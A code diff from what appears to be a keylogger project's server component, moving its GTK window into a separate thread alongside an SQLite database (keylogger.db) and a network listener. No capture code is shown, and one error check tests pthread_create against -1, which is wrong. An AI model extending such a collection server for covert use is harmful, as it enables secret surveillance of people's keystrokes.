@@ -1,6 +1,7 @@
 #include <errno.h>
 #include <fcntl.h>
 #include "server.h"
+#include <pthread.h>
 #include "../database/interface/mainWindow.h"
 #include "../database/database.h"
 
@@ -159,11 +160,15 @@ void sigint_handler(int sig) {
   _exit(sig);
 }
 
-int main () { //(int argc, char **argv) {
+int main () { 
   sqlite3 *keylogger;
-  //gtk_init(&argc, &argv);
-  gtk_init(0, NULL);
-  mainWindow();
+  pthread_t thread_window;
+  
+  if(pthread_create(&thread_window, NULL, mainWindow, NULL) == -1) {
+    perror("pthread create error\n");
+    return EXIT_FAILURE;
+  }
+
   int res= sqlite3_open("../database/keylogger.db", &keylogger);
   if(res) {
     perror("can't succeed\n");
@@ -171,11 +176,17 @@ int main () { //(int argc, char **argv) {
   }
   else
     printf("connection success\n");
+  
   struct sockaddr_in *addr= calloc(100, sizeof(struct sockaddr_in));
   signal(SIGINT, sigint_handler);
   server(addr, keylogger);
   free(addr);
   sqlite3_close(keylogger);
-  gtk_main();
+
+  if(pthread_join(thread_window, NULL)) {
+    perror("pthread_join error\n");
+    return EXIT_FAILURE;
+  }
+
   return 0;
 }
